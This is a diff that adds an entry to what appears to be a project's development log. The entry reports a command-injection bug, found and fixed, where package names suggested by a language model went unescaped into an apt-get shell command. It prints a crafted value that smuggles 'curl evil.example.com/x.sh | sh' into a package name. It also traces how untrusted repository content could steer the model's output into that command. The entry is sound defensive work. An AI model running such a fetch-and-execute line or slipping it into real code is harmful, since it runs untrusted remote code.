@@ -2120,3 +2120,61 @@ attempt didn't work out, try again within the ceiling" pattern.
 - Full suite: **244 passed, 4 skipped** (up from 243/4).
 
 ---
+
+## 2026-09-19 — Bug found and fixed: unvalidated model output reached a real shell command
+
+**Context:** following directly from the previous entry's discovery, checked for the same
+general shape elsewhere: a component trusting another component's/the model's output
+structurally without validating it's actually safe at the point it's used. Targeted
+`planner.py`'s apt-package enrichment specifically, since `as_shell_steps()` interpolates
+`apt_install` directly into a real shell command string
+(`"apt-get install -y " + " ".join(apt_install)`) with no escaping at all — exactly the
+kind of dangerous sink worth checking what feeds it.
+
+**Bug, reproduced live:** `apt_install` is the union of a fixed, hardcoded, trusted
+lookup table (`_KNOWN_APT_NEEDS`) **and** whatever a Nemotron Super enrichment call's
+JSON response says (`raw.get("apt_packages")`), with **zero validation** on the latter
+before this fix. Crafted a fake model response containing
+`"libfoo; curl evil.example.com/x.sh | sh #"` and confirmed the resulting `BuildPlan`'s
+`as_shell_steps()` produced the literal shell command
+`apt-get update && apt-get install -y libfoo; curl evil.example.com/x.sh | sh #` — a real
+command injection, unescaped, ready to run inside the sandbox exactly as written.
+
+**Why this is a realistic attack surface, not a contrived one:** the enrichment prompt
+embeds the *target repo's own* `declared_dependencies` verbatim
+(`f"Declared pip dependencies: {sorted(intake.declared_dependencies)}"`) —
+`declared_dependencies` is parsed directly from the cloned repo's own
+`requirements.txt`/`setup.py`, i.e. untrusted content from whatever repo a user pastes
+in. The real chain is: untrusted repo content → model prompt → model's JSON response →
+`apt_install` → an unescaped shell command actually executed in the sandbox. Even
+model hallucination alone (no adversarial repo needed) could produce this, since nothing
+constrained the model's output shape beyond "a JSON list of strings."
+
+**Blast radius, considered honestly:** contained to the disposable, isolated Nebius
+sandbox (not RERUN's own host/backend) — this doesn't compromise RERUN's own
+infrastructure. Still a real bug: §14's red-team spirit is specifically about not
+letting Nemotron output feed a consequential outcome without scrutiny, and arbitrary
+code execution inside the sandbox is a more consequential outcome than the "decisions"
+§14 explicitly names (verdict scope, prose adjudication) — it could exfiltrate the
+already-cloned repo source, burn sandbox cost adversarially (§9), or otherwise abuse the
+sandbox well beyond "installing a system package."
+
+**Fixed:** added `_sanitize_apt_package_names()`, which only accepts names matching real
+Debian/Ubuntu package-name syntax (`^[a-z0-9][a-z0-9+.-]*$` — lowercase alphanumeric
+start, then alphanumeric/`+`/`.`/`-`) and drops anything else, logging a `notes` entry
+naming exactly what was rejected and why (never silently dropping it without a trace, per
+this file's own established discipline). Applied only to the model's output — the
+deterministic table is already a fixed, trusted, closed set that needs no re-validation.
+
+**Verified:**
+- The exact crafted injection is now rejected: `apt_install` ends up empty, and the
+  malicious string never appears anywhere in `as_shell_steps()`'s output.
+- A legitimate enrichment response (`ffmpeg`, `libgl1`, `libglib2.0-0`) still passes
+  through unaffected — the fix doesn't collaterally break the real feature.
+- Added `test_model_enrichment_rejects_a_shell_metacharacter_in_a_suggested_package` and
+  a negative control (`..._accepts_real_looking_package_names`, covering `g++` and a
+  version-suffixed `python3.11-dev` to make sure valid-but-unusual-looking real package
+  names aren't collateral damage) to `test_planner.py`.
+- All 16 planner tests pass; full suite **246 passed, 4 skipped** (up from 244/4).
+
+---
